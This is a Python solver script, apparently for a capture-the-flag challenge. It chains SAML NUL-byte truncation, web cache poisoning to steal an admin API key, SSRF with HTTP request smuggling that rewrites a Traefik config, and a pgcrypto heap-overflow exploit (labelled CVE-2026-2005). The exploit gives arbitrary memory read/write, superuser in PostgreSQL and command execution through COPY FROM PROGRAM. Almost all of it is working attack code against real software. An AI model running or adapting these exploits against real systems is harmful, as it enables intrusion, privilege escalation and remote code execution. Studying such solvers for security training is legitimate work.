#!/usr/bin/env python3
"""
End-to-end solver for CrownSpire Bellworks.

Dependencies:
    pip install requests beautifulsoup4 psycopg2-binary pycryptodome

For the final PostgreSQL stage, pass the matching postgres debug ELF with
--symbols, or use --container to extract it from a local challenge container.
"""

import argparse
import base64
import http.client
import json
import os
import random
import re
import secrets
import struct
import subprocess
import sys
import time
from urllib.parse import urljoin, urlsplit

import psycopg2
import requests
from bs4 import BeautifulSoup
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA


AES_KEY = b"\x01" * 16
SRC_CHUNK_OFFSET = 100
DST_CHUNK_OFFSET = 172
SRC_CHUNK_HDR = bytes.fromhex(
    "010172aabbbe0000"  # unused space at the end of ctx's size class
    "63000000c0040000"  # PostgreSQL AllocSet chunk header for src
)


def log(message):
    print(f"[*] {message}", file=sys.stderr, flush=True)


def form_data(html):
    form = BeautifulSoup(html, "html.parser").find("form")
    if not form:
        raise RuntimeError("expected an HTML form")
    fields = {}
    for element in form.find_all(["input", "button"]):
        name = element.get("name")
        if name:
            fields[name] = element.get("value", "")
    return form.get("action", ""), fields


def become_clerk(base):
    """Abuse the Node/PHP NUL disagreement to obtain clerk standing."""
    session = requests.Session()
    suffix = random.randrange(1 << 32)
    email = f"bell{suffix}@vaultrune.valyssar.local\x00\u200b"
    password = f"bell-{suffix:x}"

    response = session.post(
        base + "/signup",
        json={"email": email, "displayName": "Rin", "password": password},
        allow_redirects=False,
        timeout=10,
    )
    if response.status_code not in (302, 303):
        raise RuntimeError(f"signup failed: HTTP {response.status_code}")

    response = session.get(base + "/login", timeout=10)
    action, fields = form_data(response.text)
    fields.update(username=email, password=password)
    response = session.post(urljoin(base, action), data=fields, timeout=10)

    action, fields = form_data(response.text)
    response = session.post(urljoin(base, action), data=fields, timeout=10)
    standing = session.get(base + "/api/standing", timeout=10).json()
    if standing.get("role") != "scribe":
        raise RuntimeError(f"clerk escalation failed: {standing}")
    log("obtained bell-scribe session through SAML NameID truncation")
    return session


def steal_admin_key(base, clerk, timeout=20):
    """Cache the admin-only account page under a /static/ cache key."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        cache_buster = secrets.token_hex(6)
        # The lower-case encoded slash must reach Traefik byte-for-byte.
        reference = f"/static/..%2fadmin/account?cb={cache_buster}"
        response = clerk.post(
            base + "/appeals",
            data={"reference": reference},
            allow_redirects=False,
            timeout=10,
        )
        if response.status_code not in (302, 303):
            raise RuntimeError(f"appeal submission failed: HTTP {response.status_code}")

        # An anonymous probe before the five-second bot poll would itself
        # populate the cache with a 403, so do not touch this cache key early.
        time.sleep(6)
        parsed = urlsplit(base)
        connection_class = (
            http.client.HTTPSConnection
            if parsed.scheme == "https"
            else http.client.HTTPConnection
        )
        connection = connection_class(
            parsed.hostname,
            parsed.port or (443 if parsed.scheme == "https" else 80),
            timeout=10,
        )
        connection.putrequest("GET", reference, skip_accept_encoding=True)
        connection.endheaders()
        response = connection.getresponse()
        body = response.read().decode("utf-8", "replace")
        connection.close()
        match = re.search(r'data-api-key="([^"]+)"', body)
        if match:
            log("recovered the Keeper API key from Varnish")
            return match.group(1)
    raise RuntimeError("the review bot did not populate the poisoned cache entry")


def become_admin(base, api_key):
    password = "Rin-" + secrets.token_hex(8)
    response = requests.post(
        base + "/api/account/reset-password",
        json={"api_key": api_key, "new_password": password},
        timeout=10,
    )
    if not response.ok:
        raise RuntimeError(f"password reset failed: {response.text}")

    session = requests.Session()
    response = session.post(
        base + "/admin/login",
        data={"username": "warden", "password": password},
        allow_redirects=False,
        timeout=10,
    )
    if response.status_code not in (302, 303):
        raise RuntimeError("Keeper login failed")
    log("reset the Keeper password and obtained an admin session")
    return session


def expose_postgres(base, admin):
    """
    Use URL parser disagreement for SSRF, then an accepted malformed header
    to make Oat++ ignore the outer Content-Length and parse a smuggled PUT.
    """
    dynamic_config = """tcp:
  routers:
    pg:
      entryPoints: ["web"]
      rule: "HostSNI(`*`)"
      service: pg
  services:
    pg:
      loadBalancer:
        servers:
          - address: "127.0.0.1:5432"
"""
    write_body = json.dumps(
        {
            "path": "/etc/traefik/dynamic.yml",
            "data": base64.b64encode(dynamic_config.encode()).decode(),
        },
        separators=(",", ":"),
    )
    smuggled = (
        "PUT /records/write HTTP/1.1\r\n"
        "Host: inner\r\n"
        f"Content-Length: {len(write_body.encode())}\r\n"
        "Connection: close\r\n"
        "\r\n"
        + write_body
    )

    try:
        response = admin.post(
            base + "/admin/courier",
            json={
                # urlsplit() validates the public numeric address immediately
                # (without relying on target-side DNS); urllib3 connects to
                # loopback because it parses the backslash differently.
                "address": r"http://127.0.0.1:7200\@1.1.1.1/../status",
                # Requests accepts this name. Oat++ stops at the space, records a
                # parse error, but its synchronous reader forgets to propagate it.
                "headers": {"X Y": "z"},
                "body": smuggled,
            },
            timeout=15,
        )
    except requests.exceptions.ReadTimeout:
        # A remote edge may reload the dynamic configuration before the
        # courier's HTTP response makes it back.  The PostgreSQL connection
        # probe in main() is the authoritative success check.
        log("courier response timed out; probing the edge for PostgreSQL")
        return
    if response.status_code != 200 or "body_len=0" not in response.text:
        raise RuntimeError(f"smuggling setup failed: {response.status_code} {response.text}")
    log("overwrote Traefik configuration through the smuggled inner-ward PUT")


def extract_symbols(container, destination):
    binary = "/usr/lib/postgresql/17/bin/postgres"
    notes = subprocess.check_output(
        ["docker", "exec", container, "readelf", "-n", binary], text=True
    )
    match = re.search(r"Build ID:\s*([0-9a-f]+)", notes)
    if not match:
        raise RuntimeError("could not determine the postgres build ID")
    build_id = match.group(1)
    source = (
        f"{container}:/usr/lib/debug/.build-id/"
        f"{build_id[:2]}/{build_id[2:]}.debug"
    )
    subprocess.check_call(["docker", "cp", source, destination])
    log(f"extracted matching PostgreSQL symbols to {destination}")


# ---- OpenPGP helpers -----------------------------------------------------


def mpi(value):
    bits = value.bit_length()
    magnitude = value.to_bytes((bits + 7) // 8, "big") if bits else b""
    return struct.pack(">H", bits) + magnitude


def packet(tag, body):
    length = len(body)
    if length <= 191:
        encoded_length = bytes([length])
    elif length <= 8383:
        adjusted = length - 192
        encoded_length = bytes([192 + (adjusted >> 8), adjusted & 0xFF])
    else:
        encoded_length = b"\xff" + struct.pack(">I", length)
    return bytes([0xC0 | tag]) + encoded_length + body


def build_secret_key(rsa):
    public = (
        b"\x04"
        + struct.pack(">I", int(time.time()))
        + b"\x02"
        + mpi(rsa.n)
        + mpi(rsa.e)
    )
    private = mpi(rsa.d) + mpi(rsa.p) + mpi(rsa.q) + mpi(pow(rsa.p, -1, rsa.q))
    return packet(7, public + b"\x00" + private + struct.pack(">H", sum(private) & 0xFFFF))


def build_tag1(rsa, session_data):
    message = b"\x07" + session_data + struct.pack(">H", sum(session_data) & 0xFFFF)
    modulus_bytes = (rsa.n.bit_length() + 7) // 8
    pad_length = modulus_bytes - len(message) - 2
    if pad_length < 8:
        raise ValueError("RSA modulus is too small for overflow payload")
    padded = b"\x02" + b"\xff" * pad_length + b"\x00" + message
    ciphertext = pow(int.from_bytes(padded, "big"), rsa.e, rsa.n)
    return packet(1, b"\x03" + b"\x00" * 8 + b"\x02" + mpi(ciphertext))


def pgp_cfb_encrypt(key, plaintext):
    cipher = AES.new(key[:16], AES.MODE_ECB)
    feedback = b"\x00" * 16
    first = bytes(a ^ b for a, b in zip(cipher.encrypt(feedback), plaintext[:16]))
    second = bytes(a ^ b for a, b in zip(cipher.encrypt(first)[:2], plaintext[16:18]))
    output = first + second
    feedback = first[2:] + second
    position = 18
    while position < len(plaintext):
        chunk = plaintext[position : position + 16]
        encrypted = bytes(a ^ b for a, b in zip(cipher.encrypt(feedback), chunk))
        output += encrypted
        feedback = encrypted if len(encrypted) == 16 else encrypted + feedback[len(encrypted) :]
        position += len(chunk)
    return output


def build_symenc(payload):
    literal = packet(
        11, b"b\x00" + struct.pack(">I", int(time.time())) + payload
    )
    prefix = secrets.token_bytes(16)
    plaintext = prefix + prefix[-2:] + literal
    return packet(9, pgp_cfb_encrypt(AES_KEY, plaintext))


def p32(value):
    return struct.pack("<I", value)


def p64(value):
    return struct.pack("<Q", value)


# ---- CVE-2026-2005 primitives -------------------------------------------


def leak_payload(rsa):
    overflow = b"\x01" * 32
    overflow += b"\x02" * (SRC_CHUNK_OFFSET - len(overflow))
    overflow += SRC_CHUNK_HDR
    overflow += b"\x00" * (DST_CHUNK_OFFSET - len(overflow))
    overflow += b"B" * 12
    overflow += p32(len(overflow))
    return (
        build_tag1(rsa, overflow)
        + build_symenc(b"\x0a\x00")
        + build_tag1(rsa, overflow)
    )


def arb_read_payload(rsa, target, size=0x10000):
    overflow = b"\x01" * 16 + p32(0x10)
    overflow += b"\x01" * (SRC_CHUNK_OFFSET - len(overflow))
    overflow += SRC_CHUNK_HDR
    overflow += b"\x00" * (DST_CHUNK_OFFSET - len(overflow))
    overflow += bytes.fromhex(
        "0000000000000000"  # unused end-of-size-class space
        "63000000e0050000"  # AllocSet chunk header for dst
    )
    overflow += (
        p64(target)
        + p64(target + size)
        + p64(target)
        + p64(0x7FFFFFFFFFFF)
        + b"\x00" * 8
    )
    overflow += p32(len(overflow))
    return (
        build_tag1(rsa, AES_KEY)
        + build_symenc(b"\x0a")
        + build_tag1(rsa, overflow)
    )


def arb_write_payload(rsa, mdst_address, target):
    encrypted_write = build_symenc(p32(10) + p32(10))

    # This is copied over the real dst MBuf at offset 188.
    mdst = (
        p64(target)
        + p64(target)
        + p64(target)
        + p64(0xFFFFFFFFFFFF)
        + b"\x00" * 2
    )

    # Make the overwritten src MBuf read encrypted_write, which is placed
    # directly after the forged dst MBuf in the same overflow allocation.
    source = mdst_address + len(mdst)
    msrc = (
        p64(source)
        + p64(source + len(encrypted_write))
        + p64(source)
        + p64(0xFFFFFFFFFFFF)
        + b"\x00" * 8
    )

    overflow = AES_KEY + p32(16) * 5
    overflow += b"\x01" * (SRC_CHUNK_OFFSET - len(overflow))
    overflow += SRC_CHUNK_HDR + msrc
    overflow += b"\x00" * (DST_CHUNK_OFFSET - len(overflow))
    overflow += bytes.fromhex(
        "0000000000000000"
        "63000000e0050000"
    )
    overflow += mdst + encrypted_write
    overflow += p32(len(overflow))
    return build_tag1(rsa, overflow)


def sql_for(message, secret_key):
    # Keeping the literals and line wrapping stable also keeps the backend's
    # pre-call allocator state stable across the disposable connections.
    def wrapped_hex(data):
        raw = data.hex()
        return re.sub(r"(.{72})", r"\1\n", raw, flags=re.DOTALL)

    return (
        "SELECT pgp_pub_decrypt_bytea(\n"
        f"'\\x{wrapped_hex(message)}'::bytea,\n"
        f"'\\x{wrapped_hex(secret_key)}'::bytea);"
    )


def connect_pg(params, retries=1):
    last_error = None
    for _ in range(retries):
        try:
            connection = psycopg2.connect(**params)
            connection.autocommit = True
            return connection
        except psycopg2.Error as error:
            last_error = error
            time.sleep(1)
    raise last_error


def decrypt_query(params, message, key, keep_connection=False):
    # A rejected PIE candidate can crash only its disposable backend. The
    # postmaster briefly enters crash recovery before accepting the next one.
    connection = connect_pg(params, retries=12)
    cursor = connection.cursor()
    try:
        # Match the allocator warm-up used for every exploitation backend.
        cursor.execute("SELECT pg_backend_pid()")
        cursor.fetchone()
        cursor.execute(sql_for(message, key))
        value = bytes(cursor.fetchone()[0])
        if keep_connection:
            return connection, value
        connection.close()
        return value
    except Exception as error:
        connection.close()
        return str(error)


def load_symbols(path):
    output = subprocess.check_output(
        ["readelf", "-sW", path], text=True, stderr=subprocess.DEVNULL
    )
    symbols = []
    for line in output.splitlines():
        parts = line.split()
        if len(parts) < 8 or parts[3] not in ("FUNC", "OBJECT"):
            continue
        try:
            address, size = int(parts[1], 16), int(parts[2])
        except ValueError:
            continue
        if address:
            symbols.append((parts[7], address, size))
    return symbols


def resolve_pie(memory, heap_pointer, symbols):
    heap_region = heap_pointer >> 28
    candidates = set()
    for offset in range(max(0, len(memory) - 7)):
        address = struct.unpack_from("<Q", memory, offset)[0]
        if address >= 0x500000000000 and address >> 28 != heap_region:
            candidates.add(address)

    votes = {}
    by_page_offset = {}
    for _, offset, _ in symbols:
        by_page_offset.setdefault(offset & 0xFFF, []).append(offset)
    for address in candidates:
        for offset in by_page_offset.get(address & 0xFFF, ()):
            if offset < address:
                base = address - offset
                votes[base] = votes.get(base, 0) + 1

    filtered = {base: count for base, count in votes.items() if count >= 10}
    smallest = sorted(filtered.items())[:10]
    return sorted(smallest, key=lambda item: item[1], reverse=True)


def pgcrypto_rce(params, symbol_file, command):
    rsa = RSA.generate(3072)
    secret_key = build_secret_key(rsa)

    result = decrypt_query(params, leak_payload(rsa), secret_key)
    match = re.search(r"pfree called with invalid pointer (0x[0-9a-f]+)", str(result))
    if not match:
        raise RuntimeError(f"heap pointer leak failed: {result}")
    mdst = int(match.group(1), 16)
    log(f"leaked deterministic backend heap pointer: 0x{mdst:x}")

    memory = decrypt_query(
        params, arb_read_payload(rsa, mdst - 0x10000), secret_key
    )
    if not isinstance(memory, bytes):
        raise RuntimeError(f"arbitrary read failed: {memory}")

    symbols = load_symbols(symbol_file)
    current_user_offset = next(
        (offset for name, offset, _ in symbols if name == "CurrentUserId"), None
    )
    if current_user_offset is None:
        raise RuntimeError("CurrentUserId is absent from the supplied symbol ELF")

    candidates = resolve_pie(memory, mdst, symbols)
    if not candidates:
        raise RuntimeError("could not resolve a PostgreSQL PIE base")
    log(
        "PIE candidates: "
        + ", ".join(f"0x{base:x}/{votes}" for base, votes in candidates[:5])
    )

    oid_connection = connect_pg(params)
    oid_cursor = oid_connection.cursor()
    oid_cursor.execute("SELECT current_user::regrole::oid")
    expected_oid = oid_cursor.fetchone()[0]
    oid_connection.close()

    pie_base = None
    for base, votes in candidates[:5]:
        value = decrypt_query(
            params,
            arb_read_payload(rsa, base + current_user_offset, 0x10),
            secret_key,
        )
        if isinstance(value, bytes) and len(value) >= 4:
            if struct.unpack_from("<I", value)[0] == expected_oid:
                pie_base = base
                log(f"confirmed PostgreSQL PIE base 0x{base:x} ({votes} votes)")
                break
    if pie_base is None:
        raise RuntimeError("PIE candidates did not contain CurrentUserId")

    current_user = pie_base + current_user_offset
    result = decrypt_query(
        params,
        arb_write_payload(rsa, mdst, current_user - 4),
        secret_key,
        keep_connection=True,
    )
    if not isinstance(result, tuple):
        raise RuntimeError(f"arbitrary write failed: {result}")
    connection, _ = result
    cursor = connection.cursor()
    cursor.execute("SELECT current_user::regrole::oid")
    if cursor.fetchone()[0] != 10:
        raise RuntimeError("CurrentUserId overwrite did not grant superuser")

    cursor.execute("CREATE TEMP TABLE crown_flag(line text)")
    quoted_command = cursor.mogrify("%s", (command,)).decode()
    cursor.execute(f"COPY crown_flag FROM PROGRAM {quoted_command}")
    cursor.execute("SELECT line FROM crown_flag")
    output = "\n".join(row[0] for row in cursor.fetchall())
    connection.close()
    return output


def pg_endpoint(base, host_override=None, port_override=None):
    parsed = urlsplit(base)
    return host_override or parsed.hostname, port_override or parsed.port or 80


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1:1337")
    parser.add_argument("--symbols", default="./postgres.debug")
    parser.add_argument(
        "--container",
        help="extract matching postgres dbgsym from this local Docker container",
    )
    parser.add_argument("--skip-web", action="store_true")
    parser.add_argument("--pg-host")
    parser.add_argument("--pg-port", type=int)
    parser.add_argument("--command", default="/readflag")
    args = parser.parse_args()
    base = args.url.rstrip("/")

    # Resolve the required local symbols before making the irreversible
    # Traefik change that turns the remote HTTP port into PostgreSQL.
    if not os.path.exists(args.symbols):
        if not args.container:
            raise SystemExit(
                f"{args.symbols} does not exist; pass --symbols or --container"
            )
        extract_symbols(args.container, args.symbols)

    if not args.skip_web:
        clerk = become_clerk(base)
        api_key = steal_admin_key(base, clerk)
        admin = become_admin(base, api_key)
        expose_postgres(base, admin)

    host, port = pg_endpoint(base, args.pg_host, args.pg_port)
    params = {
        "host": host,
        "port": port,
        "dbname": "ctfdb",
        "user": "ctf_user",
        "connect_timeout": 5,
    }
    connect_pg(params, retries=12).close()
    log("Traefik now exposes PostgreSQL on the challenge port")
    print(pgcrypto_rce(params, args.symbols, args.command))


if __name__ == "__main__":
    main()
